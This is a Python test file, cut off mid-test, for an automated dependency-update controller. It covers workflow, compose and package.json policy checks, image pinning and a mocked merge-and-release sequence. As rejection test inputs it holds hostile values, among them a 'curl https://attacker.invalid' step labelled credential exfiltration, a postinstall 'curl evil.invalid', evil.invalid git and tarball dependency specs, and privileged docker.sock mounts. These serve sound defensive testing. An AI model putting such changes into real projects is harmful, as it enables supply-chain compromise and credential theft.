"""Offline policy and controller regression tests (Python stdlib only)."""
import base64
import contextlib
import copy
import importlib.util
import io
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT = Path(__file__).resolve().parents[1] / "dependency_agent.py"
SPEC = importlib.util.spec_from_file_location("dependency_agent_under_test", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
agent = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(agent)

IMAGE = "node:22.14.0-bookworm-slim@sha256:" + "a" * 64
NEW_IMAGE = "node:22.15.0-bookworm-slim@sha256:" + "b" * 64
WORKFLOW = """name: CI
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: IMAGE
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test && npm run build
""".replace("IMAGE", IMAGE)
COMPOSE = "services:\n  app:\n    image: " + IMAGE + "\n    ports: [\"8080:8080\"]\n"


def aligned_files():
    return {
        "compose.yaml": COMPOSE,
        **dict.fromkeys(agent.WORKFLOWS, WORKFLOW),
        "package.json": json.dumps({"engines": {"node": "^22.14.0"}}),
    }


class CommandOutputTests(unittest.TestCase):
    def test_api_parses_json_when_command_emits_stderr_hint(self):
        original_run = agent.run
        program = 'import sys; print("{\\"number\\": 8}"); print("hint: informational message", file=sys.stderr)'
        output, diagnostics = io.StringIO(), io.StringIO()
        with mock.patch.object(agent, "run", side_effect=lambda *args: original_run(
            sys.executable, "-c", program,
        )), contextlib.redirect_stdout(output), contextlib.redirect_stderr(diagnostics):
            self.assertEqual(agent.api("repos/example/project/pulls/8"), {"number": 8})
        self.assertEqual(output.getvalue(), "")
        self.assertIn("hint: informational message", diagnostics.getvalue())

    def test_failed_command_preserves_both_streams_and_raises(self):
        output, diagnostics = io.StringIO(), io.StringIO()
        with (contextlib.redirect_stdout(output), contextlib.redirect_stderr(diagnostics),
              self.assertRaisesRegex(agent.Stop, "Command failed \\(7\\)")):
            agent.run(sys.executable, "-c",
                      'import sys; print("partial output"); print("failure detail", file=sys.stderr); sys.exit(7)')
        self.assertIn("partial output", output.getvalue())
        self.assertIn("failure detail", diagnostics.getvalue())

    def test_non_capture_prints_stdout_and_returns_only_stdout(self):
        output, diagnostics = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(output), contextlib.redirect_stderr(diagnostics):
            result = agent.run(sys.executable, "-c",
                               'import sys; print("result"); print("warning", file=sys.stderr)', capture=False)
        self.assertEqual(result, "result")
        self.assertEqual(output.getvalue(), "result\n")
        self.assertEqual(diagnostics.getvalue(), "warning\n")


class PolicyTests(unittest.TestCase):
    def test_workflow_action_and_image_versions_are_normalized(self):
        updated = WORKFLOW.replace("checkout@v4", "checkout@" + "c" * 40).replace(IMAGE, NEW_IMAGE)
        self.assertEqual(agent.normalize_workflow(WORKFLOW), agent.normalize_workflow(updated))
        for path in agent.WORKFLOWS:
            with self.subTest(path=path):
                self.assertIsNone(agent.policy_error(path, WORKFLOW, updated))

    def test_named_step_action_versions_are_normalized(self):
        old = WORKFLOW.replace(
            "      - uses: actions/checkout@v4",
            "      - name: Read Pages configuration\n"
            "        id: pages\n"
            "        uses: actions/configure-pages@v5",
        )
        updated = old.replace("configure-pages@v5", "configure-pages@v6")
        for path in agent.WORKFLOWS:
            with self.subTest(path=path):
                self.assertIsNone(agent.policy_error(path, old, updated))
                for before, after in (
                    ("actions/configure-pages", "attacker/configure-pages"),
                    ("Read Pages configuration", "Different name"),
                    ("id: pages", "id: other"),
                    ("contents: read", "contents: write"),
                    ("npm test", "true"),
                    ("uses:", "- uses:"),
                ):
                    with self.subTest(before=before):
                        self.assertIsNotNone(agent.policy_error(
                            path, old, updated.replace(before, after),
                        ))

    def test_normalization_preserves_comments_and_nonversion_content(self):
        old = "- uses: actions/checkout@v4 # trusted\n"
        new = "- uses: actions/checkout@v5 # untrusted\n"
        self.assertNotEqual(agent.normalize_workflow(old), agent.normalize_workflow(new))
        self.assertEqual(agent.normalize_workflow("run: npm test\n"), "run: npm test\n")

    def test_workflow_adversarial_modifications_rejected(self):
        changes = {
            "permissions": WORKFLOW.replace("contents: read", "contents: write"),
            "permissions_added": WORKFLOW.replace("contents: read", "contents: read\n  id-token: write"),
            "skip_tests": WORKFLOW.replace("npm test", "true"),
            "credential_exfiltration": WORKFLOW.replace("npm ci", "curl https://attacker.invalid"),
            "action_repository": WORKFLOW.replace("actions/checkout", "attacker/checkout"),
            "trigger": "on: pull_request_target\n" + WORKFLOW,
            "secret": WORKFLOW + "    env:\n      TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
        }
        for path in agent.WORKFLOWS:
            for name, new in changes.items():
                with self.subTest(path=path, attack=name):
                    self.assertIsNotNone(agent.policy_error(path, WORKFLOW, new))

    def test_action_like_text_in_shell_script_is_not_a_version_update(self):
        old = WORKFLOW + "      - run: |\n          uses: echo@safe\n"
        new = old.replace("echo@safe", "echo@malicious")
        self.assertIsNotNone(agent.policy_error(agent.WORKFLOWS[0], old, new))

    def test_image_like_text_in_shell_script_is_not_an_image_update(self):
        old = WORKFLOW + "      - run: |\n          image: safe\n"
        new = old.replace("image: safe", "image: malicious")
        self.assertIsNotNone(agent.policy_error(agent.WORKFLOWS[0], old, new))

    def test_compose_only_images_are_normalized(self):
        updated = COMPOSE.replace(IMAGE, NEW_IMAGE)
        self.assertEqual(agent.normalize_compose(COMPOSE), agent.normalize_compose(updated))
        self.assertIsNone(agent.policy_error("compose.yaml", COMPOSE, updated))
        self.assertNotEqual(agent.normalize_compose(COMPOSE), agent.normalize_compose(COMPOSE.replace("8080", "9090")))
        for extra in ("    privileged: true\n", "    volumes: [/var/run/docker.sock:/var/run/docker.sock]\n", "    command: skip-tests\n"):
            with self.subTest(extra=extra):
                self.assertIsNotNone(agent.policy_error("compose.yaml", COMPOSE, COMPOSE + extra))

    def test_compose_script_image_text_is_not_an_image_reference(self):
        old = COMPOSE + "    command: |\n      image: safe\n"
        self.assertIsNotNone(agent.policy_error("compose.yaml", old, old.replace("image: safe", "image: malicious")))

    def test_image_registry_and_repository_swaps_are_not_normalized(self):
        for path, old, normalize in (
            ("compose.yaml", COMPOSE, agent.normalize_compose),
            *((path, WORKFLOW, agent.normalize_workflow) for path in agent.WORKFLOWS),
        ):
            for replacement in ("evil.invalid/" + IMAGE, IMAGE.replace("node:", "evil-node:")):
                with self.subTest(path=path, replacement=replacement):
                    new = old.replace(IMAGE, replacement)
                    self.assertNotEqual(normalize(old), normalize(new))
                    self.assertIsNotNone(agent.policy_error(path, old, new))

    def test_scalar_variants_preserve_script_text_but_normalize_real_images(self):
        for scalar in (">-", "|2"):
            for path, prefix, header, normalize in (
                ("compose.yaml", COMPOSE, "    command: ", agent.normalize_compose),
                *((path, WORKFLOW, "      - run: ", agent.normalize_workflow) for path in agent.WORKFLOWS),
            ):
                for shell_line in ("image: " + IMAGE, "- uses: actions/checkout@v4"):
                    with self.subTest(scalar=scalar, path=path, shell_line=shell_line):
                        indent = "      " if path == "compose.yaml" else "          "
                        old = prefix + header + scalar + "\n" + indent + shell_line + "\n"
                        new = old.replace(indent + shell_line, indent + shell_line.replace(IMAGE, NEW_IMAGE).replace("@v4", "@v5"))
                        self.assertNotEqual(normalize(old), normalize(new))
                        self.assertIsNotNone(agent.policy_error(path, old, new))
                        # A dedented real YAML image after the scalar is still normalizable.
                        old += "    image: " + IMAGE + "\n"
                        new = old.rsplit(IMAGE, 1)
                        self.assertEqual(normalize(old), normalize(NEW_IMAGE.join(new)))

    def test_package_dependency_and_engine_changes_allowed(self):
        old = {"name": "app", "scripts": {"test": "node --test"},
               "dependencies": {"foo": "1.0.0"}, "devDependencies": {"bar": "~2.0.0"}}
        for version in ("2.1.0", "^2.1.0", "~2.1.0", "=2.1.0", "2.1.0-beta.1", "2.1.0+build.5"):
            with self.subTest(version=version):
                new = {**old, "dependencies": {"foo": version}, "devDependencies": {"bar": "^3.0.0"},
                       "engines": {"node": "^22.14.0"}}
                self.assertIsNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))

    def test_dependency_names_cannot_be_added_removed_or_moved(self):
        old = {"dependencies": {"foo": "1.0.0"}, "devDependencies": {"bar": "2.0.0"}}
        for section in ("dependencies", "devDependencies"):
            for replacement in ({}, {"evil": "1.0.0"}, {**old[section], "evil": "1.0.0"}):
                with self.subTest(section=section, replacement=replacement):
                    new = {**old, section: replacement}
                    self.assertIsNotNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))
            new = dict(old)
            del new[section]
            self.assertIsNotNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))
        new = {"dependencies": {**old["dependencies"], **old["devDependencies"]}}
        self.assertIsNotNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))
        self.assertIsNotNone(agent.policy_error("package.json", "{}", json.dumps({"devDependencies": {"bar": "1.0.0"}})))

    def test_dependency_alias_local_git_and_nonsemver_attacks_rejected(self):
        for section in ("dependencies", "devDependencies"):
            old = {section: {"foo": "1.0.0"}}
            for version in ("npm:evil@1.0.0", "file:../evil", "link:../evil", "workspace:*",
                            "git+https://evil.invalid/repo.git", "github:evil/repo", "https://evil.invalid/a.tgz",
                            "latest", "*", "^1", "1.2", ">=1.0.0", None, 123):
                with self.subTest(section=section, version=version):
                    new = {section: {"foo": version}}
                    self.assertIsNotNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))

    def test_non_node_engine_changes_require_review(self):
        old = {"engines": {"node": "^22.14.0", "npm": "10.0.0"}}
        new = {"engines": {"node": "^22.15.0", "npm": "11.0.0"}}
        self.assertIsNotNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))

    def test_package_scripts_and_metadata_changes_rejected(self):
        old = {"name": "app", "scripts": {"test": "node --test", "build": "vite build"}}
        for new in ({**old, "scripts": {"test": "true"}}, {**old, "scripts": {**old["scripts"], "postinstall": "curl evil.invalid"}}, {**old, "type": "module"}):
            with self.subTest(new=new):
                self.assertIsNotNone(agent.policy_error("package.json", json.dumps(old), json.dumps(new)))

    def test_protected_paths_and_tests_rejected(self):
        paths = ("scripts/dependency_agent.py", "scripts/tests/test_dependency_agent.py", "src/a.test.ts", "src/a.spec.tsx", "src/__tests__/a.ts", "src/x/__snapshots__/a.snap", ".github/workflows/evil.yml", "tests/a.ts", "vite.config.ts", ".npmrc")
        for path in paths:
            with self.subTest(path=path):
                self.assertIsNotNone(agent.policy_error(path, "old", "new"))

    def test_supported_source_lockfile_and_readme_allowed(self):
        for path in ("src/components/App.tsx", "src/lib/contest.ts", "package-lock.json", "README.md"):
            with self.subTest(path=path):
                self.assertIsNone(agent.policy_error(path, "old", "new"))

    def test_additions_and_deletions_require_review_even_for_allowed_paths(self):
        for path in ("src/app.ts", "package.json", "README.md", *agent.WORKFLOWS):
            for old, new in ((None, "new"), ("old", None)):
                with self.subTest(path=path, old=old):
                    self.assertIsNotNone(agent.policy_error(path, old, new))


class ImageTests(unittest.TestCase):
    def test_matching_pinned_images_and_exact_engine(self):
        self.assertEqual(agent.aligned_image(aligned_files()), IMAGE)

    def test_image_version_or_digest_mismatch_rejected(self):
        for path in ("compose.yaml", *agent.WORKFLOWS):
            for replacement in (NEW_IMAGE, IMAGE.replace("a" * 64, "b" * 64)):
                with self.subTest(path=path, replacement=replacement):
                    files = aligned_files()
                    files[path] = files[path].replace(IMAGE, replacement)
                    with self.assertRaises(agent.Stop):
                        agent.aligned_image(files)

    def test_missing_duplicate_unpinned_and_wrong_variant_rejected(self):
        for value in ("", IMAGE + "\n" + IMAGE, "node:22.14.0-bookworm-slim", IMAGE.replace("bookworm", "alpine")):
            for path in ("compose.yaml", *agent.WORKFLOWS):
                with self.subTest(path=path, value=value):
                    files = aligned_files()
                    files[path] = value
                    with self.assertRaises(agent.Stop):
                        agent.aligned_image(files)

    def test_engine_missing_or_mismatched_rejected(self):
        for package in ({}, {"engines": {}}, {"engines": {"node": "22"}}, {"engines": {"node": "^22.15.0"}}):
            with self.subTest(package=package):
                files = aligned_files()
                files["package.json"] = json.dumps(package)
                with self.assertRaises(agent.Stop):
                    agent.aligned_image(files)

    def test_pinned_image_must_not_be_a_substring_of_another_image(self):
        for bad in ("evil.invalid/" + IMAGE, IMAGE + "a"):
            with self.subTest(image=bad):
                files = {key: value.replace(IMAGE, bad) for key, value in aligned_files().items()}
                with self.assertRaises(agent.Stop):
                    agent.aligned_image(files)


class ControllerTestCase(unittest.TestCase):
    git: mock.Mock
    external_run: mock.Mock
    api: mock.Mock

    def setUp(self):
        # Deny external effects even if a regression reaches an unexpected path.
        for name in ("git", "run", "api"):
            patcher = mock.patch.object(agent, name, side_effect=AssertionError("Unexpected external call: " + name))
            setattr(self, "external_run" if name == "run" else name, patcher.start())
            self.addCleanup(patcher.stop)
        patcher = mock.patch.object(agent.subprocess, "run", side_effect=AssertionError("Unexpected subprocess"))
        patcher.start()
        self.addCleanup(patcher.stop)
        patcher = mock.patch.object(agent.urllib.request, "urlopen", side_effect=AssertionError("Unexpected HTTP"))
        patcher.start()
        self.addCleanup(patcher.stop)
        output = contextlib.redirect_stdout(io.StringIO())
        output.__enter__()
        self.addCleanup(output.__exit__, None, None, None)
        self.controller = agent.Controller.__new__(agent.Controller)
        self.controller.root = Path("/offline/repo")
        self.operation = {"token": "trusted-token", "number": 42, "head": "pr-head", "branch": "dependabot/foo", "base": "base-sha", "worktree": "/offline/work", "attempts": 0, "stage": "prepared", "integration": "integration-sha"}
        self.controller.state = {"active": self.operation, "history": [], "halt": None}
        self.controller.save = mock.Mock()
        self.controller.fetch = mock.Mock()
        self.controller.ref = mock.Mock(return_value="base-sha")
        self.controller.pr = mock.Mock(return_value={"number": 42, "state": "open", "head": {"sha": "pr-head", "ref": "dependabot/foo"}})
        self.controller.check_policy = mock.Mock(return_value=IMAGE)
        self.controller.verify = mock.Mock(return_value=IMAGE)
        self.controller.wait_ci = mock.Mock(return_value="https://ci.invalid/run")
        self.controller.comment = mock.Mock()


class ControllerTests(ControllerTestCase):
    def test_wrong_token_cannot_read_finish_or_abort(self):
        before = copy.deepcopy(self.controller.state)
        for action in (lambda: self.controller.active("wrong"), lambda: self.controller.finish("wrong"), lambda: self.controller.abort("wrong", "reason")):
            with self.assertRaises(agent.Stop):
                action()
        self.assertEqual(self.controller.state, before)
        self.controller.save.assert_not_called()
        self.controller.fetch.assert_not_called()
        self.controller.comment.assert_not_called()

    def test_candidates_skip_drafts_and_all_ineligible_prs(self):
        eligible = {"number": 20, "user": {"login": agent.BOT, "type": "Bot"},
                    "draft": False, "head": {"repo": {"full_name": agent.REPO}},
                    "base": {"ref": agent.BASE}}
        invalid = []
        for change in ({"draft": True}, {"user": {"login": "attacker", "type": "Bot"}},
                       {"user": {"login": agent.BOT, "type": "User"}},
                       {"head": {"repo": None}}, {"head": {"repo": {"full_name": "evil/repo"}}},
                       {"base": {"ref": "develop"}}):
            invalid.append({**copy.deepcopy(eligible), **change, "number": len(invalid) + 1})
        self.api.side_effect = None
        self.api.return_value = [[*invalid[:3], eligible], [*invalid[3:], {**eligible, "number": 10}]]
        candidates = self.controller.candidates()
        self.assertEqual([pr["number"] for pr in candidates], [10, 20])
        self.api.assert_called_once_with(
            f"repos/{agent.REPO}/pulls?state=open&base={agent.BASE}&per_page=100", "--paginate", "--slurp")
        self.git.assert_not_called()
        self.external_run.assert_not_called()

    def test_fetch_only_main(self):
        self.git.side_effect = None
        self.git.return_value = f"https://github.com/{agent.REPO}.git"
        agent.Controller.fetch(self.controller)
        self.assertEqual(self.git.call_args_list, [
            mock.call(self.controller.root, "remote", "get-url", "origin"),
            mock.call(self.controller.root, "fetch", "origin", "main"),
        ])

    def test_legacy_operation_requires_retargeted_pr_without_reset(self):
        self.controller.pr = agent.Controller.pr.__get__(self.controller)
        self.api.side_effect = None
        self.api.return_value = {
            "user": {"login": agent.BOT, "type": "Bot"},
            "head": {"repo": {"full_name": agent.REPO}},
            "base": {"ref": "develop"}, "draft": False,
        }
        self.operation["stage"] = "needs-fix"
        self.operation["attempts"] = 1
        self.operation["develop_ci"] = "legacy-ci"
        self.controller.finish("trusted-token")
        self.assertIs(self.controller.state["active"], self.operation)
        self.assertEqual(self.operation["attempts"], 2)
        self.assertEqual(self.operation["base"], "base-sha")
        self.assertEqual(self.operation["develop_ci"], "legacy-ci")
        self.assertIn("PR to main", self.operation["error"])
        self.controller.verify.assert_not_called()
        self.git.assert_not_called()
        self.external_run.assert_not_called()
        self.api.return_value["base"]["ref"] = "main"
        self.assertEqual(self.controller.pr(42)["base"]["ref"], "main")

    def test_trusted_main_controller_allows_idle_start(self):
        self.controller.state["active"] = None
        self.controller.candidates = mock.Mock(return_value=[])
        self.git.side_effect = None
        self.git.return_value = "trusted controller"
        with mock.patch.object(Path, "read_text", return_value="trusted controller\n"):
            self.controller.start()
        self.git.assert_called_once_with(self.controller.root, "show", "origin/main:scripts/dependency_agent.py")
        self.controller.candidates.assert_called_once()
        self.controller.ref.assert_not_called()

    def test_no_active_operation_rejects_token(self):
        self.controller.state["active"] = None
        with self.assertRaises(agent.Stop):
            self.controller.active("trusted-token")

    def test_halt_prevents_start(self):
        self.controller.state.update(active=None, halt="manual recovery")
        with self.assertRaises(agent.Stop):
            self.controller.start()
        self.controller.fetch.assert_not_called()
        self.controller.save.assert_not_called()

    def test_active_operation_prevents_start(self):
        self.controller.start(99)
        self.controller.fetch.assert_not_called()
        self.controller.pr.assert_not_called()
        self.controller.save.assert_not_called()
        self.assertIs(self.controller.state["active"], self.operation)

    def test_halt_or_unsafe_stage_prevents_finish(self):
        for stage in ("merging", "publishing-fix", "releasing", "verifying", "released"):
            with self.subTest(stage=stage):
                self.operation["stage"] = stage
                with self.assertRaises(agent.Stop):
                    self.controller.finish("trusted-token")
        self.operation["stage"] = "prepared"
        self.controller.state["halt"] = "uncertain remote outcome"
        with self.assertRaises(agent.Stop):
            self.controller.finish("trusted-token")
        self.assertEqual(self.operation["attempts"], 0)
        self.controller.fetch.assert_not_called()

    def test_attempt_limit_prevents_verification(self):
        for attempts in (agent.MAX_ATTEMPTS, agent.MAX_ATTEMPTS + 1):
            with self.subTest(attempts=attempts):
                self.operation["attempts"] = attempts
                with self.assertRaises(agent.Stop):
                    self.controller.finish("trusted-token")
                self.assertEqual(self.operation["attempts"], attempts)
        self.controller.verify.assert_not_called()
        self.controller.fetch.assert_not_called()

    def test_failed_attempt_is_counted_and_durable(self):
        self.controller.fetch.side_effect = agent.Stop("offline fetch failure")
        self.controller.finish("trusted-token")
        self.assertEqual(self.operation["attempts"], 1)
        self.assertEqual(self.operation["stage"], "needs-fix")
        self.assertIn("offline fetch failure", self.operation["error"])
        self.assertGreaterEqual(self.controller.save.call_count, 2)
        self.controller.verify.assert_not_called()

    def test_last_failed_attempt_records_revision_and_clears_active(self):
        self.operation["attempts"] = agent.MAX_ATTEMPTS - 1
        self.controller.fetch.side_effect = agent.Stop("fetch failed")
        self.git.side_effect = None  # Only mocked best-effort worktree cleanup is allowed.
        self.controller.finish("trusted-token")
        self.assertIsNone(self.controller.state["active"])
        self.assertEqual(self.controller.state["history"][0]["head"], "pr-head")
        self.assertEqual(self.controller.state["history"][0]["attempts"], agent.MAX_ATTEMPTS)
        self.assertEqual(self.controller.state["history"][0]["stage"], "blocked")
        self.external_run.assert_not_called()

    def test_untrusted_controller_prevents_start(self):
        self.controller.state["active"] = None
        self.git.side_effect = None
        self.git.return_value = "trusted controller"
        with (mock.patch.object(Path, "read_text", return_value="modified controller"),
              self.assertRaisesRegex(agent.Stop, "trusted main")):
            self.controller.start(42)
        self.git.assert_called_once_with(self.controller.root, "show", "origin/main:scripts/dependency_agent.py")
        self.controller.pr.assert_not_called()
        self.external_run.assert_not_called()
        self.assertIsNone(self.controller.state["active"])

    def test_moved_main_prevents_finish_merge(self):
        self.controller.ref.return_value = "moved-sha"
        self.controller.finish("trusted-token")
        self.assertEqual(self.operation["stage"], "needs-fix")
        self.assertIn("Base main moved", self.operation["error"])
        self.controller.verify.assert_not_called()
        self.git.assert_not_called()
        self.external_run.assert_not_called()

    def test_divergence_after_ci_still_prevents_merge(self):
        self.git.side_effect = None
        self.git.return_value = ""

        def git_result(root, *args):
            return "integration-sha" if args == ("rev-parse", "HEAD") else ""

        self.git.side_effect = git_result
        self.controller.ref.side_effect = ["base-sha", "moved-sha"]
        self.controller.finish("trusted-token")
        self.controller.verify.assert_called_once()
        self.controller.wait_ci.assert_called_once()
        self.assertEqual(self.operation["stage"], "needs-fix")
        self.assertIn("Refs changed", self.operation["error"])
        self.external_run.assert_not_called()
        self.assertFalse(any("push" in call.args or "merge" in call.args for call in self.git.call_args_list))

    def test_changed_pr_prevents_verification_and_merge(self):
        self.controller.pr.return_value["head"]["sha"] = "new-head"
        self.controller.finish("trusted-token")
        self.assertEqual(self.operation["stage"], "needs-fix")
        self.controller.verify.assert_not_called()
        self.git.assert_not_called()
        self.external_run.assert_not_called()

    def test_abort_unsafe_stage_or_halt_cannot_clear_active(self):
        for stage, halt in (("merging", None), ("publishing-fix", None), ("prepared", "halted")):
            with self.subTest(stage=stage, halt=halt):
                self.operation["stage"] = stage
                self.controller.state["halt"] = halt
                with self.assertRaises(agent.Stop):
                    self.controller.abort("trusted-token", "reason")
                self.assertIs(self.controller.state["active"], self.operation)
        self.controller.save.assert_not_called()

    def test_complete_persists_success_before_cleanup_failure(self):
        self.git.side_effect = agent.Stop("cleanup failed")
        self.controller.complete(self.operation)
        self.assertIsNone(self.controller.state["active"])
        self.assertEqual(self.controller.state["history"], [self.operation])
        self.assertIsNot(self.controller.state["history"][0], self.operation)
        self.controller.save.assert_called_once()

    def test_state_is_loaded_from_external_state_home(self):
        self.git.side_effect = None
        self.git.return_value = "/offline/repo/.git"
        with tempfile.TemporaryDirectory() as temporary, mock.patch.dict(agent.os.environ, {"XDG_STATE_HOME": temporary}):
            first = agent.Controller(Path("/offline/repo"))
            self.assertEqual(first.state, {"active": None, "history": [], "halt": None})
            first.state = {"active": self.operation, "history": [{"number": 7, "head": "old"}], "halt": "manual recovery"}
            first.save()
            second = agent.Controller(Path("/offline/repo"))
            self.assertEqual(second.state, first.state)
            self.assertTrue(second.state_path.is_relative_to(Path(temporary)))


class FinishTransactionTests(ControllerTestCase):
    """Simulate remote reality, recording every boundary and durable snapshot."""

    def configure_transaction(self, failure=None, error=None, parents=None, dirty=False):
        self.operation.update(attempts=0, stage="prepared", head="pr-head", integration="integration-sha")
        self.controller.state = {"active": self.operation, "history": [], "halt": None}
        self.effects = []
        self.saved = []
        self.remote = {agent.BASE: "base-sha"}
        self.checked_out = "integration-sha"
        self.did_merge = False
        self.failure = failure
        self.error = error or agent.Stop("injected failure: " + str(failure))
        work = Path(self.operation["worktree"])

        def record(name, *args):
            self.effects.append((name, *args))
            if self.failure == name:
                raise self.error

        def save():
            self.saved.append(copy.deepcopy(self.controller.state))
            record("save", self.operation["stage"], self.controller.state["halt"])

        def fetch():
            record("fetch")

        def ref(branch):
            record("ref", branch)
            return self.remote[branch]

        def pr(number):
            record("pr", number)
            return {"number": number, "state": "closed" if self.did_merge else "open",
                    "head": {"sha": self.operation["head"], "ref": "dependabot/foo"},
                    "merged": self.did_merge, "merge_commit_sha": "github-merged-sha"}

        def git(root, *args):
            record("git", root, *args)
            if args == ("ls-files", "-u"):
                return ""
            if args in (("merge-base", "--is-ancestor", "base-sha", "HEAD"),
                        ("merge-base", "--is-ancestor", "pr-head", "HEAD")):
                return ""
            if args == ("status", "--porcelain", "--untracked-files=normal"):
                return " M package.json" if dirty else ""
            if args == ("add", "-A"):
                return ""
            if args == ("commit", "-m", "fix: align dependency update for PR #42"):
                self.checked_out = "fixed-sha"
                return ""
            if args == ("rev-parse", "HEAD"):
                return self.checked_out
            if args == ("show", "-s", "--format=%P", "github-merged-sha"):
                return parents if parents is not None else "base-sha " + self.operation["head"]
            if args == ("reset", "--hard", "github-merged-sha"):
                self.checked_out = "github-merged-sha"
                return ""
            if args == ("push", "origin", "fixed-sha:refs/heads/dependabot/foo"):
                record("fix-push", "fixed-sha")
                return ""
            if args == ("worktree", "remove", "--force", str(work)):
                record("cleanup")
                return ""
            raise AssertionError("Unexpected git command: " + repr(args))

        def merge(*args, **kwargs):
            self.assertEqual(args, ("gh", "pr", "merge", "42", "--repo", agent.REPO,
                                    "--merge", "--match-head-commit", self.operation["head"]))
            self.assertEqual(kwargs, {"timeout": 120})
            self.did_merge = True
            self.remote[agent.BASE] = "github-merged-sha"
            record("github-merge", self.operation["head"])
            return ""

        def verify(operation):
            self.assertIs(operation, self.operation)
            self.assertEqual(operation["verifying_sha"], self.checked_out)
            self.assertEqual(self.saved[-1]["active"]["verifying_sha"], self.checked_out)
            record("verify-merged" if self.did_merge else "verify-candidate", operation["verifying_sha"])
            return IMAGE

        def wait_ci(sha, workflow, event, branch):
            name = "pr-ci" if event == "pull_request" else "pages" if workflow == "pages.yml" else "main-ci"
            record(name, sha, workflow, event, branch)
            return "https://ci.invalid/" + name

        def http(url, **kwargs):
            self.assertEqual(kwargs, {"timeout": 30})
            record("http", url)
            response = mock.MagicMock()
            response.__enter__.return_value = response
            response.status = 200
            response.read.return_value = b"<!doctype html><HTML>ok</HTML>"
            return response

        self.controller.check_policy.side_effect = lambda operation: record("policy", self.checked_out) or IMAGE
        self.controller.save.side_effect = save
        self.controller.fetch.side_effect = fetch
        self.controller.ref.side_effect = ref
        self.controller.pr.side_effect = pr
        self.controller.verify.side_effect = verify
        self.controller.wait_ci.side_effect = wait_ci
        self.controller.comment.side_effect = lambda operation, text: record("comment", operation["stage"], text)
        self.git.side_effect = git
        self.external_run.side_effect = merge
        agent.urllib.request.urlopen.side_effect = http

    def event_names(self):
        return [event[0] for event in self.effects]

    def assert_halted_without_retry(self, stage):
        self.assertEqual(self.operation["stage"], stage)
        self.assertTrue(self.controller.state["halt"])
        self.assertIs(self.controller.state["active"], self.operation)
        self.assertEqual(self.controller.state["history"], [])
        self.assertEqual(self.saved[-1], self.controller.state)
        self.assertIn(str(self.error), self.saved[-1]["halt"])
        self.assertNotIn("cleanup", self.event_names())
        # Halt must be durable before reporting, and no later command may retry effects.
        self.assertEqual(self.event_names()[-2:], ["save", "comment"])
        before = copy.deepcopy(self.effects)
        for action in (lambda: self.controller.finish("trusted-token"),
                       lambda: self.controller.start(),
                       lambda: self.controller.abort("trusted-token", "retry")):
            with self.assertRaises(agent.Stop):
                action()
        self.assertEqual(self.effects, before)

    def test_success_releases_the_actual_github_merge_in_order(self):
        self.configure_transaction()
        self.controller.finish("trusted-token")
        significant = [event for event in self.effects if event[0] in {
            "verify-candidate", "pr-ci", "github-merge", "verify-merged", "main-ci",
            "production-push", "pages", "http", "cleanup"}]
        self.assertEqual(significant, [
            ("verify-candidate", "integration-sha"),
            ("pr-ci", "pr-head", "ci.yml", "pull_request", "dependabot/foo"),
            ("github-merge", "pr-head"),
            ("verify-merged", "github-merged-sha"),
            ("main-ci", "github-merged-sha", "ci.yml", "push", agent.BASE),
            ("pages", "github-merged-sha", "pages.yml", "push", agent.BASE),
            *(("http", agent.SITE + route) for route in ("/", "/consumi/", "/prezzi/", "/tetto/")),
            ("cleanup",),
        ])
        self.external_run.assert_called_once()
        reset = ("git", Path("/offline/work"), "reset", "--hard", "github-merged-sha")
        parents = ("git", self.controller.root, "show", "-s", "--format=%P", "github-merged-sha")
        self.assertLess(self.effects.index(parents), self.effects.index(reset))
        self.assertLess(self.effects.index(reset), self.effects.index(("verify-merged", "github-merged-sha")))
        self.assertLess(self.effects.index(("save", "merging", None)), self.effects.index(("github-merge", "pr-head")))
        self.assertLess(self.effects.index(("save", "releasing", None)), self.event_names().index("pages"))
        self.assertFalse(any("push" in call.args for call in self.git.call_args_list))
        self.assertEqual(self.operation["main_ci"], "https://ci.invalid/main-ci")
        self.assertIsNone(self.controller.state["active"])
        self.assertIsNone(self.controller.state["halt"])
        released = self.controller.state["history"][0]
        self.assertEqual(released["stage"], "released")
        self.assertEqual(released["merged"], "github-merged-sha")
        self.assertEqual(released["attempts"], 1)
        self.assertEqual(self.saved[-1], self.controller.state)
        self.assertEqual(self.event_names()[-3:], ["save", "git", "cleanup"])

    def test_main_movement_after_merge_or_ci_or_deploy_halts(self):
        for fetch_number, stage in ((3, "merging"), (4, "verifying-merged"), (5, "releasing")):
            with self.subTest(fetch_number=fetch_number):
                self.configure_transaction()
                original_fetch = self.controller.fetch.side_effect
                count = 0

                def fetch(original_fetch=original_fetch, fetch_number=fetch_number):
                    nonlocal count
                    count += 1
                    original_fetch()
                    if count == fetch_number:
                        self.remote[agent.BASE] = "unrelated-sha"

                self.controller.fetch.side_effect = fetch
                self.controller.finish("trusted-token")
                self.assertEqual(self.operation["stage"], stage)
                self.assertTrue(self.controller.state["halt"])
                self.assertIs(self.controller.state["active"], self.operation)
                self.assertNotIn("http", self.event_names())
                self.assertFalse(any("push" in call.args for call in self.git.call_args_list))

    def test_dirty_candidate_is_committed_then_verified_then_published_unchanged(self):
        self.configure_transaction(dirty=True)
        self.controller.finish("trusted-token")
        self.assertIsNone(self.controller.state["halt"])
        self.assertIsNone(self.controller.state["active"])
        commit = ("git", Path("/offline/work"), "commit", "-m", "fix: align dependency update for PR #42")
        policy = ("policy", "integration-sha")
        verified = ("verify-candidate", "fixed-sha")
        published = ("fix-push", "fixed-sha")
        ci = ("pr-ci", "fixed-sha", "ci.yml", "pull_request", "dependabot/foo")
        merged = ("github-merge", "fixed-sha")
        ordered = [policy, commit, verified, published, ci, merged, ("verify-merged", "github-merged-sha")]
        positions = [self.effects.index(event) for event in ordered]
        self.assertEqual(positions, sorted(positions))
        # No staging or commit is allowed after candidate verification.
        after_verify = self.effects[self.effects.index(verified) + 1:]
